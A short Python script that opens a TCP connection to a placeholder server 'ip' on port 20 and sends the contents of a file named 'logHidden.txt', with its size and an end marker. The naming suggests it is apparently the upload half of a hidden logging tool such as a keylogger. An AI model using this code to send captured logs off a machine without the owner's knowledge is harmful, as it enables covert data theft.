import os
import socket

server = "ip"
port = 20

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server, port))

file = open("logHidden.txt", "rb")
file_size = os.path.getsize("logHidden.txt")

client.send("gotit.txt".encode())
client.send(str(file_size).encode())

data = file.read()
client.sendall(data)
client.send(b"<ME>")

file.close()
client.close()